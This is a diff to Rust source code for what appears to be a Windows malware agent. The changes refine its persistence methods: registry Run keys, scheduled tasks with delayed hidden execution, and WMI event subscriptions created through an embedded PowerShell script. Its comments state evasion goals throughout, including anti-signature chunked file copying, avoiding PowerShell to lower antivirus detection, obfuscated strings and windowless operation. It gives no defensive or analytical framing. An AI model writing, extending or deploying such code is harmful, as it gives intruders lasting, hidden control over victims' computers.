@@ -17,7 +17,9 @@ const MIN_CPU_CORES: usize = 2;
 const MIN_UPTIME_MS: u64 = 180_000; // 3 minutes
 
 // File copy anti-signature constants
+#[cfg(target_os = "windows")]
 const CHUNK_SIZES: [usize; 4] = [12288, 16384, 8192, 24576];
+#[cfg(target_os = "windows")]
 const MAX_CHUNK_SIZE: usize = 24576;
 
 /// Métodos de persistencia disponibles
@@ -42,6 +44,7 @@ impl PersistenceMethod {
 }
 
 /// Verifica si la ruta actual es persistente y estable
+#[cfg(target_os = "windows")]
 fn is_persistent_location(path: &Path) -> bool {
     if let Some(path_str) = path.to_str() {
         let path_upper = path_str.to_uppercase();
@@ -55,6 +58,7 @@ fn is_persistent_location(path: &Path) -> bool {
 }
 
 /// Verifica si la ubicación es temporal/volátil
+#[cfg(target_os = "windows")]
 fn is_temporary_location(path: &Path) -> bool {
     if let Some(path_str) = path.to_str() {
         let path_upper = path_str.to_uppercase();
@@ -182,6 +186,7 @@ fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
 }
 
 /// Obtiene ruta del ejecutable en ubicación persistente
+#[cfg(target_os = "windows")]
 fn get_current_exe_path() -> Result<PathBuf, String> {
     let current_exe = env::current_exe().map_err(|e| format!("E0: {}", e))?;
     ensure_persistent_location(&current_exe)
@@ -189,6 +194,7 @@ fn get_current_exe_path() -> Result<PathBuf, String> {
 
 /// Generate a pseudo-random index based on machine-specific data
 /// This ensures consistency per machine but variation across machines
+#[cfg(target_os = "windows")]
 fn get_machine_index() -> usize {
     let username = env::var("USERNAME").unwrap_or_default();
     let computername = env::var("COMPUTERNAME").unwrap_or_default();
@@ -204,7 +210,24 @@ fn get_machine_index() -> usize {
     hash.wrapping_add(pid as usize)
 }
 
+/// Escape special characters in path for safe shell execution
+/// Replaces problematic characters that could be used for command injection
+#[cfg(target_os = "windows")]
+fn escape_shell_path(path: &str) -> String {
+    // In Windows cmd.exe, the main concerns are:
+    // - & (command separator)
+    // - | (pipe)
+    // - ^ (escape character)
+    // - < > (redirection)
+    // - " (quote - handled by our quoting)
+    // Since we wrap paths in double quotes, most special chars are safe
+    // We escape ^ and % which have special meaning even inside quotes
+    path.replace("^", "^^").replace("%", "%%")
+}
+
 /// Registry Run persistence - método más simple y efectivo
+/// Uses cmd /c start /min wrapper to hide execution window
+/// Note: The agent must be compiled with --features production for windowless operation
 #[cfg(target_os = "windows")]
 fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
     let exe_str = exe_path
@@ -251,7 +274,7 @@ fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
 }
 
 /// Scheduled Task persistence with enhanced evasion
-/// Uses delayed execution and background mode
+/// Uses cmd wrapper with delayed execution - avoids PowerShell for lower AV detection
 #[cfg(target_os = "windows")]
 fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
     let exe_str = exe_path
@@ -284,8 +307,8 @@ fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
 
     // Task command with delay and hidden execution
     let task_cmd = format!(
-        r#"cmd /c timeout /t {} /nobreak >nul && start /b "" "{}""#,
-        delay_secs, exe_str
+        r#"cmd.exe /c timeout /t {} /nobreak >nul && start /min "" "{}""#,
+        delay_secs, exe_escaped
     );
 
     // Create scheduled task on logon with additional delay
@@ -313,6 +336,8 @@ fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
 
 /// WMI Event Subscription persistence
 /// Uses time-based triggers which are less monitored than logon events
+/// Note: WMI persistence requires admin rights and may not work on all systems
+/// Uses cmd.exe wrapper for execution to avoid PowerShell detection on trigger
 #[cfg(target_os = "windows")]
 fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
     let exe_str = exe_path
@@ -338,22 +363,24 @@ fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
     // Compact PowerShell WMI script
     let ps_script = format!(
         concat!(
-            "$F=([wmiclass]'\\\\.\root\\subscription:__EventFilter').CreateInstance();",
+            "$F=([wmiclass]'{}:__EventFilter').CreateInstance();",
             "$F.Name='{}';",
-            "$F.EventNamespace='root\\cimv2';",
+            "$F.EventNamespace='{}';",
             "$F.QueryLanguage='WQL';",
             "$F.Query='SELECT * FROM __InstanceModificationEvent WITHIN 14400 ",
             "WHERE TargetInstance ISA ''Win32_LocalTime'' AND TargetInstance.Hour={}';",
             "$F.Put()|Out-Null;",
-            "$C=([wmiclass]'\\\\.\root\\subscription:CommandLineEventConsumer').CreateInstance();",
+            "$C=([wmiclass]'{}:CommandLineEventConsumer').CreateInstance();",
             "$C.Name='{}';",
-            "$C.CommandLineTemplate='cmd /c start /b \"\" \"{}\"';",
+            "$C.CommandLineTemplate='cmd.exe /c start /min \"\" \"{}\"';",
             "$C.Put()|Out-Null;",
-            "$B=([wmiclass]'\\\\.\root\\subscription:__FilterToConsumerBinding').CreateInstance();",
+            "$B=([wmiclass]'{}:__FilterToConsumerBinding').CreateInstance();",
             "$B.Filter=$F;$B.Consumer=$C;",
             "$B.Put()|Out-Null"
         ),
-        event_name, trigger_hour, event_name, exe_escaped
+        wmi_root, event_name, cimv2_ns, trigger_hour,
+        wmi_root, event_name, exe_wmi_escaped,
+        wmi_root
     );
 
     let ps_exe = obfstr!("powershell").to_string();
@@ -384,7 +411,7 @@ fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
 }
 
 /// Startup folder persistence using shortcut file
-/// Creates a .lnk file with minimized window style
+/// DISABLED: Too easily detected by AV - use registry or task instead
 #[cfg(target_os = "windows")]
 fn persist_startup_folder(exe_path: &Path) -> Result<String, String> {
     let exe_str = exe_path
